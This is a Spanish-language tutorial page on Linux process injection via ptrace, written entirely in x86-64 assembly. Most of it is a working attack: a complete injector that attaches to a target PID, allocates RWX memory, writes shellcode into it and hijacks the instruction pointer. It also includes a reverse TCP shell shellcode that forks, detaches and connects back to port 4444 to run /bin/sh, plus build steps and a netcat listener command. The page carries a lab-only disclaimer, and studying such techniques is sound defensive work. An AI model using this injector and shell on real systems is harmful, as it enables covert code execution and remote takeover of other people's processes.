# Process Injection via Ptrace - Just ASM

<figure class="hero-image" markdown>
  ![Ptrace Injection](../../assets/images/ptrace-hero.svg){ width="100%" }
</figure>

Inyección de código en procesos Linux usando ptrace, implementado completamente en ensamblador x86-64. Sin dependencias externas, sin libc, solo syscalls puras.

---

## Introducción

La técnica de **Process Injection via Ptrace** permite a un proceso (el *tracer*) tomar control de otro proceso en ejecución (el *tracee*) para inyectar y ejecutar código arbitrario en su espacio de direcciones. Esta técnica es ampliamente utilizada en:

- **Depuradores** (GDB, LLDB)
- **Herramientas de instrumentación** (strace, ltrace)
- **Malware y rootkits**
- **Técnicas de evasión de seguridad**

La syscall `ptrace` es el mecanismo que provee Linux para permitir que un proceso observe y controle la ejecución de otro proceso, examinar y modificar su memoria y registros.

---

## Arquitectura de la técnica

El flujo completo de la inyección consta de las siguientes fases:

### Fase 1: Adjuntar al proceso víctima
Usamos `PTRACE_ATTACH` para conectarnos al proceso objetivo. Esto envía una señal `SIGSTOP` al tracee, deteniendo su ejecución. Debemos esperar con `wait4` hasta que el proceso esté efectivamente detenido.

### Fase 2: Preservar el estado original
Con `PTRACE_GETREGS` obtenemos todos los registros del CPU del proceso víctima. Esto incluye el **RIP** (instruction pointer), que nos dice exactamente dónde se detuvo la ejecución. Guardamos una copia completa para restaurarla después.

### Fase 3: Inyectar instrucción syscall
Necesitamos que el proceso víctima ejecute una syscall `mmap` para reservar memoria. Para esto:

1. Leemos los bytes donde apunta el RIP actual (`PTRACE_PEEKDATA`)
2. Guardamos esos bytes originales
3. Sobrescribimos con la instrucción `syscall` (0x0F 0x05) usando `PTRACE_POKEDATA`

### Fase 4: Ejecutar mmap en el contexto víctima
Configuramos los registros para que cuando se ejecute la instrucción `syscall`, se invoque `mmap` con los argumentos correctos:

- **RAX** = 9 (número de syscall mmap)
- **RDI** = 0 (dirección NULL, el kernel elige)
- **RSI** = 4096 (tamaño de página)
- **RDX** = 7 (PROT_READ | PROT_WRITE | PROT_EXEC)
- **R10** = 34 (MAP_PRIVATE | MAP_ANONYMOUS)
- **R8** = -1 (sin file descriptor)
- **R9** = 0 (offset)

Usamos `PTRACE_SINGLESTEP` para ejecutar una sola instrucción y obtener el resultado de mmap en RAX.

### Fase 5: Restaurar estado original
Restauramos los bytes originales donde estaba el RIP y los registros originales del proceso.

### Fase 6: Inyectar shellcode
Escribimos nuestro shellcode byte a byte en la memoria RWX que acabamos de reservar con mmap.

### Fase 7: Redirigir ejecución
Modificamos el RIP para que apunte al inicio de nuestro shellcode y soltamos el proceso con `PTRACE_DETACH`.

---

## Estructura user_regs_struct

En x86-64 Linux, la estructura `user_regs_struct` contiene todos los registros del CPU. El layout es el siguiente:

| Offset | Registro | Descripción |
|--------|----------|-------------|
| 0x00 | r15 | Registro de propósito general |
| 0x08 | r14 | Registro de propósito general |
| 0x10 | r13 | Registro de propósito general |
| 0x18 | r12 | Registro de propósito general |
| 0x20 | rbp | Base pointer |
| 0x28 | rbx | Registro de propósito general |
| 0x30 | r11 | Clobbered por syscall |
| 0x38 | r10 | 4to argumento syscall |
| 0x40 | r9 | 6to argumento syscall |
| 0x48 | r8 | 5to argumento syscall |
| 0x50 | rax | Número de syscall / valor de retorno |
| 0x58 | rcx | Clobbered por syscall |
| 0x60 | rdx | 3er argumento syscall |
| 0x68 | rsi | 2do argumento syscall |
| 0x70 | rdi | 1er argumento syscall |
| 0x78 | orig_rax | Número original de syscall |
| 0x80 | rip | Instruction pointer |
| 0x88 | cs | Code segment |
| 0x90 | eflags | Flags del CPU |
| 0x98 | rsp | Stack pointer |
| 0xA0 | ss | Stack segment |
| 0xA8 | fs_base | Base del segmento FS |
| 0xB0 | gs_base | Base del segmento GS |
| 0xB8 | ds | Data segment |
| 0xC0 | es | Extra segment |
| 0xC8 | fs | FS segment |
| 0xD0 | gs | GS segment |

La estructura tiene un tamaño total de **27 qwords (216 bytes)**.

---

## Consideraciones sobre Little-Endian

x86-64 usa **little-endian**, lo que significa que el byte menos significativo (LSB) se almacena primero en memoria. Esto es crucial al trabajar con valores en memoria:

```
Valor en registro: 0x00007ffe6f9001b0

Descomposición:
  0x 00 00 7f fe 6f 90 01 b0
     ▲                    ▲
     │                    │
    MSB                 LSB
   (más significativo) (menos significativo)


En memoria (little-endian, LSB primero):

RIP → 0x7f7a85496687:  ┌────┐
                       │ b0 │ ← Primer byte en memoria
      0x7f7a85496688:  ├────┤
                       │ 01 │
      0x7f7a85496689:  ├────┤
                       │ 90 │
      0x7f7a8549668a:  ├────┤
                       │ 6f │
      0x7f7a8549668b:  ├────┤
                       │ fe │
      0x7f7a8549668c:  ├────┤
                       │ 7f │
      0x7f7a8549668d:  ├────┤
                       │ 00 │
      0x7f7a8549668e:  ├────┤
                       │ 00 │
                       └────┘
```

Por esto, cuando inyectamos la instrucción `syscall` (bytes `0x0F 0x05`), debemos usar el valor `0x050F` en little-endian para que se almacene correctamente como `0F 05` en memoria.

---

## Inyector Principal (proc_inj.asm)

Este es el programa inyector completo. Lee atentamente los comentarios que explican cada paso:

```nasm

section .data
shellcode:
    db 0xb8, 0x39, 0x00, 0x00, 0x00, 0x0f, 0x05, 0x48
    db 0x83, 0xf8, 0x00, 0x74, 0x11, 0x4c, 0x8d, 0x1d
    db 0xec, 0xff, 0xff, 0xff, 0x4d, 0x8b, 0xb3, 0xf8
    db 0x0f, 0x00, 0x00, 0x41, 0xff, 0xe6, 0xb8, 0x70
    db 0x00, 0x00, 0x00, 0x0f, 0x05, 0xb8, 0x29, 0x00
    db 0x00, 0x00, 0xbf, 0x02, 0x00, 0x00, 0x00, 0xbe
    db 0x01, 0x00, 0x00, 0x00, 0x48, 0x31, 0xd2, 0x0f
    db 0x05, 0x49, 0x89, 0xc0, 0xb8, 0x2a, 0x00, 0x00
    db 0x00, 0x4c, 0x89, 0xc7, 0x4d, 0x31, 0xc9, 0x41
    db 0x51, 0x49, 0xba, 0x02, 0x00, 0x11, 0x5c, 0x7f
    db 0x00, 0x00, 0x01, 0x41, 0x52, 0x48, 0x89, 0xe6
    db 0xba, 0x10, 0x00, 0x00, 0x00, 0x0f, 0x05, 0x48
    db 0x31, 0xf6, 0xb8, 0x21, 0x00, 0x00, 0x00, 0x4c
    db 0x89, 0xc7, 0x0f, 0x05, 0x48, 0xff, 0xc6, 0x48
    db 0x83, 0xfe, 0x03, 0x7c, 0xed, 0xb8, 0x3b, 0x00
    db 0x00, 0x00, 0x6a, 0x00, 0x49, 0xbc, 0x2f, 0x62
    db 0x69, 0x6e, 0x2f, 0x73, 0x68, 0x00, 0x41, 0x54
    db 0x48, 0x89, 0xe7, 0x6a, 0x00, 0x48, 0x89, 0xe6
    db 0x6a, 0x00, 0x48, 0x89, 0xe2, 0x0f, 0x05, 0xb8
    db 0x3c, 0x00, 0x00, 0x00, 0x48, 0x31, 0xff, 0x0f
    db 0x05, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90
sc_len equ $ - shellcode
    
section .bss
    regs resq 27  ; sizeof(user_regs_struct) en x86_64  (27x8 bytes)
    regs_ori resq 27
    regs_sys resq 27 


section .text
global _start
_start:

    ; PID
    mov r15, 26559


; 1 Attach y detención del proceso:

    ; PTRACE_ATTACH
    mov rax, 101
    mov rdi, 16          ; PTRACE_ATTACH (0x10)
    mov rsi, r15         ; PID
    xor rdx,rdx          ; addr
    xor r10, r10         ; data
    syscall


    ; WAIT4: 
        ; Cuando se hace PTRACE_ATTACH, el kernel envía SIGSTOP al proceso objetivo. 
        ; Es necesario llamar a wait4 para bloquear al tracer hasta que el proceso tracee  
        ; esté efectivamente detenido antes de poder manipularlo.

        mov rax, 61
        mov rdi, r15            ; PID a esperar (-1 para cualquier hijo)
        sub rsp, 8
        mov rsi, rsp            ; &status
        xor rdx, rdx            ; options
        xor r10, r10            ; rusage
        syscall

; -----------------------------------------

; 2 Preservación del contexto de ejecución

    ; PTRACE_GETREGS
    mov rax, 101
    mov rdi, 12   ; PTRACE_GETREGS
    mov rsi, r15  ; PID
    xor rdx, rdx  ; addr
    lea r10, [rel regs] ; puntero al buffer donde se va almacenar la estructura de registros
    syscall
    
    ; En este punto, regs contiene:
    ; 0x00  r15
    ; 0x08  r14
    ; 0x10  r13
    ; 0x18  r12
    ; 0x20  rbp
    ; 0x28  rbx
    ; 0x30  r11
    ; 0x38  r10
    ; 0x40  r9
    ; 0x48  r8
    ; 0x50  rax
    ; 0x58  rcx
    ; 0x60  rdx
    ; 0x68  rsi
    ; 0x70  rdi
    ; 0x78  orig_rax
    ; 0x80  rip
    ; 0x88  cs
    ; 0x90  eflags
    ; 0x98  rsp
    ; 0xA0  ss
    ; 0xA8  fs_base
    ; 0xB0  gs_base
    ; 0xB8  ds
    ; 0xC0  es
    ; 0xC8  fs
    ; 0xD0  gs

    ; Copia de los registros originales del traceee en el buffer de backup
    lea rsi, [rel regs]       ; RSI se usa como puntero de origen y va avanzando
    lea rdi, [rel regs_ori]   ; RDI se usa como puntero destino y va avanzando

    mov rcx, 27               ; RCX se usa como contador y se va decrementando hasta 0
    cld                       ; DF=0 (dirección de copia ascendente)
    rep movsq                 ; mueve RCX qwords: [RSI] -> [RDI]

                    ; movsq copia un qword (8 bytes) desde la dirección apuntada por RSI hacia la dirección apuntada por RDI   
                    ; rep repite esa operación RCX veces

; -----------------------------------------


; 3 Inyección de la instrucción syscall (0x0f 0x05)


    mov r12, [regs+0x80]   ; Contenido del RIP del proceso tracee (dirección de la próxima instrucción a ejecutar)

    ; PTRACE_PEEKDATA (leer memoria) Se leen 8 bytes a partir de la dirección actual a la que apunta el RIP del proceso tracee
    mov rax, 101
    mov rdi, 2       ; PTRACE_PEEKDATA
    mov rsi, r15     ; PID
    mov rdx, r12     ; addr
    sub rsp, 8       ; 8 bytes
    mov r10, rsp     ; puntero a data (direccion donde se almacenará la info leída)
    syscall 

    mov r11, [rsp] ; En r11 y en el tope del stack se encuentra el valor al que apunta RIP del tracee
    mov r13, r11 ; Backup del valor original
    and r11, 0xFFFFFFFFFFFF0000 ; limpiar los 2 bytes bajos
    or r11, 0x000000000000050F  ; insertar syscall (0x0f 0x05 en little-endian)

    ; PTRACE_POKEDATA (escribir en memoria)
    mov rax, 101
    mov rdi, 5     ; PTRACE_POKEDATA
    mov rsi, r15   ; PID
    mov rdx, r12   ; addr 
    mov r10, r11   ; valor de 8 bytes a escribir
    syscall


; -----------------------------------------


; 4 Configuración de registros para MMAP


    ; MMAP

        mov qword [regs+0x50], 9       ; (RAX) Se sustituye todo el valor del registro       Número de syscall para mmap
        mov qword [regs+0x70],0        ; (RDI)       rdi = addr = 0 (NULL) → Pide al kernel que elija la dirección
        mov qword [regs+0x68],4096     ; (RSI)    rsi = length = 4096 bytes (1 página típica)
        mov qword [regs+0x60],7        ; (RDX)       rdx = prot = 7 => PROT_READ(1) | PROT_WRITE(2) | PROT_EXEC(4)
        mov qword [regs+0x38],34       ; (R10)      r10 = flags = 34 => MAP_PRIVATE(0x2) | MAP_ANONYMOUS(0x20)
        mov qword [regs+0x48],-1       ; (R8)       r8 = fd = -1 (usado con MAP_ANONYMOUS; -1 indica "no file")
        mov qword [regs+0x40],0        ; (R9)        r9 = offset = 0 (desplazamiento en el fd; irrelevante con ANONYMOUS)
    
    ; PTRACE_SETREGS
        mov rax, 101
        mov rdi, 13    ; PTRACE_SETREGS
        mov rsi, r15   ; PID
        xor rdx, rdx   ; addr
        lea r10, [rel regs] ; puntero al buffer donde se encuentra la estructura de registros
        syscall


; -----------------------------------------


; 5 Ejecución controlada de la syscall MMAP

    ;PTRACE_SINGLESTEP
    mov rax, 101
    mov rdi, 9       ; PTRACE_SINGLESTEP
    mov rsi, r15     ; PID
    xor rdx, rdx     ; addr
    xor r10, r10     ; data
    syscall

    ; WAIT4: 
    mov rax, 61
    mov rdi, r15            ; PID a esperar (-1 para cualquier hijo)
    sub rsp, 8
    mov rsi, rsp            ; &status
    xor rdx, rdx            ; options
    xor r10, r10            ; rusage
    syscall

    ; PTRACE_GETREGS
    mov rax, 101
    mov rdi, 12   ; PTRACE_GETREGS
    mov rsi, r15  ; PID
    xor rdx, rdx  ; addr
    lea r10, [rel regs_sys] ; puntero al buffer donde se va almacenar la estructura de registros
    syscall
    

; -----------------------------------------


; 6 Obtención del resultado de la syscall MMAP


    xor r12, r12 
    mov r12, [regs_sys+0x50]       ; (RAX) dirección donde comienza la zona de memoria reservada com permisos RWX


; -----------------------------------------

; 7 Restauración del contenido ubicado en la dirección a la que apunta el registro RIP del tracee

        xor r14, r14
        mov r14, [regs_ori+0x80]

        ; PTRACE_POKEDATA (escribir en memoria)
        mov rax, 101
        mov rdi, 5     ; PTRACE_POKEDATA
        mov rsi, r15   ; PID
        mov rdx, r14   ; addr 
        mov r10, r13   ; valor de 8 bytes a escribir
        syscall

        ; Comprobación de que se haya restaurado el bytearray de manera adecuada
        ; PTRACE_PEEKDATA (leer memoria)
        ;mov rax, 101
        ;mov rdi, 2       ; PTRACE_PEEKDATA
        ;mov rsi, r15     ; PID
        ;mov rdx, r14     ; addr
        ;sub rsp, 8
        ;mov r10, rsp     ; puntero a data (direccion donde se almacenará la info leída)
        ;syscall 

; -----------------------------------------


; 8 Restauración de los registros originales del proceso tracee



        ; PTRACE_SETREGS
        mov rax, 101
        mov rdi, 13    ; PTRACE_SETREGS
        mov rsi, r15   ; PID
        xor rdx, rdx   ; addr
        lea r10, [rel regs_ori] ; puntero al buffer donde se encuentra la estructura de registros
        syscall



; -----------------------------------------

; 9 Almacenamiento del RIP de retorno en los últimos 8 bytes de la región de memoria reservada por MMAP


        ; PTRACE_POKEDATA (escribir en memoria)
        mov rax, 101
        mov rdi, 5     ; PTRACE_POKEDATA
        mov rsi, r15   ; PID
        lea rdx, [r12+4088]   ; addr 
        mov r10, r14   ; valor de 8 bytes a escribir
        syscall
        
        ; Verificar que se ha escrito el valor del RIP de retorno en la región de memoria reservada por MMAP
        
        ; PTRACE_PEEKDATA
        ;mov rax, 101
        ;mov rdi, 2       ; PTRACE_PEEKDATA
        ;mov rsi, r15     ; PID
        ;lea rdx, [r12+4088]     ; addr
        ;sub rsp, 8       ; 8 bytes
        ;mov r10, rsp     ; puntero a data (direccion donde se almacenará la info leída)
        ;syscall 
        


; -----------------------------------------

; 10 Inyección del shellcode en la zona de memoria reservada

    xor r13,r13
    lea r13, [rel shellcode]   ; puntero al shellcode
    xor r14, r14
    mov r14, sc_len / 8        ; contador de palabras a escribir
    push r12

    .loop_inj:

        cmp r14, 0     ; compara el contador de palabras a escribir con 0
        jz .done       ; si contador == 0, saltar a .done

        ; PTRACE_POKEDATA
        mov rax, 101
        mov rdi, 5     ; PTRACE_POKEDATA
        mov rsi, r15   ; PID
        mov rdx, r12   ; addr 
        mov r10, [r13] ; valor de 8 bytes a escribir
        syscall

        add r12, 8
        add r13, 8
        dec r14
        jmp .loop_inj


; -----------------------------------------

    .done

        ; Verificar que el shellcode se escribió bien
        ;mov rax, 101
        ;mov rdi, 2          ; PTRACE_PEEKDATA
        ;mov rsi, r15
        ;mov rdx, r12        ; dirección mmap
        ;sub rsp, 8       ; 8 bytes
        ;mov r10, rsp     ; puntero a data (direccion donde se almacenará la info leída)
        ;syscall 

        pop r12

        mov qword [regs_ori+0x80], r12   ; RIP == dirección del inicio de la memoria reservada == inicio del shellcode
        mov qword [regs_ori+0x78], -1    ; orig_rax = -1 (evita syscall restart)


        ; PTRACE_SETREGS
        mov rax, 101
        mov rdi, 13    ; PTRACE_SETREGS
        mov rsi, r15   ; PID
        xor rdx, rdx   ; addr
        lea r10, [rel regs_ori] ; puntero al buffer donde se encuentra la estructura de registros
        syscall



    ; PTRACE_DETACH
    mov rax, 101
    mov rdi, 17    ; PTRACE_DETACH
    mov rsi, r15   ; PID
    xor rdx, rdx   ; addr
    xor r10, r10   ; signal = 0 (no enviar señal)
    syscall


    ; EXIT
    mov rax, 60
    xor rdi,rdi 
    syscall



;Explicar fork, setsid y munmap
```

---

## Shellcode: Reverse TCP Shell (proc_inj_rev_tcp.asm)

Este es el shellcode que se inyecta en el proceso víctima. Su diseño es especialmente interesante porque:

1. **Usa `fork()`** para crear un proceso hijo que manejará la conexión reversa
2. **El proceso padre retorna** a la ejecución normal del programa víctima
3. **El hijo llama a `setsid()`** para desvincularse de la terminal y crear una nueva sesión
4. **Establece una conexión TCP** al atacante y redirige stdin/stdout/stderr al socket

### ¿Por qué fork?

Si el shellcode ejecutara directamente la reverse shell sin hacer fork, el proceso víctima quedaría "secuestrado" ejecutando `/bin/sh`. Al hacer fork:

- El **proceso padre** (PID original de la víctima) recupera el RIP de retorno almacenado al final de la región mmap y continúa su ejecución normal
- El **proceso hijo** ejecuta la reverse shell de forma independiente

### ¿Por qué setsid?

`setsid()` crea una nueva sesión y hace que el proceso hijo sea el líder de esa sesión. Esto lo desvincula de cualquier terminal controladora, evitando que señales como SIGHUP afecten a la shell reversa.

### Estructura de sockaddr_in

La estructura para la conexión TCP se construye en el stack:

```
Entrada esperada: 02 00 11 5c 7F 00 00 01 00 00 00 00 00 00 00 00   
                  └──┘  └──┘  └────────┘  └──────────────────────┘
                  0-1   2-3   4-7         8-15         (16 bytes en total)
                  fam   port  IP          padding

Bytes 0-1:   02 00           → sin_family (AF_INET = 2)
Bytes 2-3:   11 5c           → sin_port (4444 en network byte order)
Bytes 4-7:   7F 00 00 01     → sin_addr (127.0.0.1)
Bytes 8-15:  00 00 00 00...  → sin_zero (padding)
```

```nasm

section .text
global _start
_start:


    ; FORK
    mov rax, 57
    syscall

    cmp rax, 0           ; si rax==0 se trata del hijo
    jz .child            

                            ; r11 porque es un registro clobbered (destruido por las syscalls)
                                ; por tanto, no se está modificando un registro funcional del proceso tracee
    lea r11, [rel _start] ; r11 = dirección de _start = mmap_base = RIP inicial del shellcode


                            ; Nunca se debe asignar un valor a R11 antes de un syscall si se pretende recuperar después

    ; Proceso Padre
    mov r14, [r11+4088] ; Obtiene dirección de retorno
    jmp r14             ; Salta a la dirección de retorno sobreescribiendo el registro RIP


.child


    ; SETSID
    mov rax, 112
    syscall


    ; SOCKET
    mov rax, 41
    mov rdi, 2 ;IPV4
    mov rsi, 1 ;TCP
    xor rdx, rdx ; Default
    syscall

    ; Store socket FD
    mov r8, rax

    ; CONNECT
    mov rax, 42
    mov rdi, r8
                    ;   Stack        Low  <----------- High
    ; Entrada esperada: 02 00 11 5c C0 A8 12 8D 00 00 00 00 00 00 00 00   
    ;                   └──┘  └──┘  └────────┘  └──────────────────────┘
    ;                   0-1   2-3   4-7         8-15         (16 bytes en total)
    ;                   fam   port  IP          padding

    ; Mapeado de los campos de sockaddr_in:
                        ; Bytes 0-1:   02 00           → sin_family (AF_INET = 2)
                        ; Bytes 2-3:   11 5c           → sin_port (4444)
                        ; Bytes 4-7:   7F 00 00 01     → sin_addr (127.0.0.1)
                        ; Bytes 8-15:  00 00 00 00...  → sin_zero (padding)
    xor r9,r9 ; 0
    push r9 ; 64 bits de padding a 0 (sin_zero)(8 bytes)
    mov r10, 0x0100007F5c110002
    push r10 ; sin_family + sin_port + sin_addr (8 bytes)
    mov rsi, rsp ; direccion del tope de la pila
    mov rdx, 16 ;IPV4 (espera 16 bytes)
    syscall


    xor rsi,rsi
.dup2:                        ; stdin(0), stdout(1), stderr(2) redirigidos al socket
    ;DUP2
    mov rax, 33
    mov rdi, r8
    syscall 
    inc rsi
    cmp rsi, 3
    jl .dup2

    ; EXEXCVE
    mov rax, 59

    push 0                       ; null terminator de /bin/sh -> /bin/sh\0
    mov r12, 0x68732f6e69622f    ; /bin/sh (2F 62 69 6E 2F 73 68) en little-endian
    push r12                     ; string /bin/sh
    mov rdi, rsp

    push 0                       ; argv = {NULL}
    mov rsi, rsp

    push 0                       ; envp = {NULL}
    mov rdx, rsp

    syscall 

.done:
    ; EXIT
    mov rax, 60                    ; syscall: exit
    xor rdi, rdi                   ; exit code = 0 (éxito)
    syscall                        
```

---

## Diagrama de memoria post-inyección

```
┌─────────────────────────────────────────────────────────────┐
│                    PROCESO VÍCTIMA                          │
├─────────────────────────────────────────────────────────────┤
│                                                             │
│  Código original del proceso                                │
│  ┌─────────────────────────────────────────────────────┐    │
│  │ ...                                                 │    │
│  │ [RIP original] → instrucción donde se detuvo        │◄───┤ Restaurado
│  │ ...                                                 │    │
│  └─────────────────────────────────────────────────────┘    │
│                                                             │
├─────────────────────────────────────────────────────────────┤
│                                                             │
│  MMAP Region (4096 bytes, RWX)                              │
│  ┌─────────────────────────────────────────────────────┐    │
│  │ +0x000: shellcode _start (fork)                     │◄───┤ Nuevo RIP
│  │ +0x008: ...                                         │    │
│  │ +0x010: código padre (jmp a retorno)                │    │
│  │ +0x020: .child (setsid, socket, connect...)         │    │
│  │ +0x080: .dup2 loop                                  │    │
│  │ +0x0A0: execve("/bin/sh")                           │    │
│  │ ...                                                 │    │
│  │ +0xFF8: RIP de retorno original                     │◄───┤ Guardado aquí
│  └─────────────────────────────────────────────────────┘    │
│                                                             │
└─────────────────────────────────────────────────────────────┘
```

---

## Compilación y uso

```bash
# Compilar el inyector
nasm -f elf64 proc_inj.asm -o proc_inj.o
ld proc_inj.o -o proc_inj

# Compilar el shellcode (para testing independiente)
nasm -f elf64 proc_inj_rev_tcp.asm -o shell.o
ld shell.o -o shell

# Encontrar PID del proceso objetivo
ps aux | grep <nombre_proceso>

# Modificar el PID en proc_inj.asm (línea: mov r15, <PID>)

# Recompilar y ejecutar (requiere CAP_SYS_PTRACE o mismo UID)
./proc_inj

# En otra terminal: listener para la reverse shell
nc -lvnp 4444
```

---

## Notas adicionales

### Sobre orig_rax

Antes de hacer `PTRACE_DETACH`, establecemos `orig_rax = -1`. Esto es crucial porque si el proceso estaba en medio de una syscall cuando lo interrumpimos, Linux podría intentar reiniciar esa syscall automáticamente. Al establecer `orig_rax = -1`, le indicamos al kernel que no hay syscall que reiniciar.

### Sobre los registros clobbered

Los registros `R11` y `RCX` son "clobbered" (destruidos) por cada `syscall`. El kernel los usa internamente:

- **RCX** almacena el RIP de retorno
- **R11** almacena los RFLAGS

Por eso en el shellcode usamos `R11` para calcular direcciones relativas justo después del fork, antes de cualquier otra syscall.

### Consideraciones de seguridad

Para que ptrace funcione:

1. El tracer debe tener el mismo UID que el tracee, O
2. El tracer debe tener `CAP_SYS_PTRACE`, O  
3. El tracer debe ser root

Además, `/proc/sys/kernel/yama/ptrace_scope` controla restricciones adicionales:

- **0**: Sin restricciones
- **1**: Solo procesos hijos (default en muchas distros)
- **2**: Solo con CAP_SYS_PTRACE
- **3**: Ptrace completamente deshabilitado

---

!!! danger "Solo en entornos controlados"
    Este código es para fines educativos y de investigación. Ejecutar únicamente en máquinas virtuales o entornos de laboratorio propios. El uso indebido de estas técnicas es ilegal.

---

!!! recursos "Referencias"
    - [ptrace(2) - Linux manual](https://man7.org/linux/man-pages/man2/ptrace.2.html)
    - [Syscall Table x86-64](https://blog.rchapman.org/posts/Linux_System_Call_Table_for_x86_64/)
    - [user_regs_struct - Linux source](https://elixir.bootlin.com/linux/latest/source/arch/x86/include/asm/user_64.h)
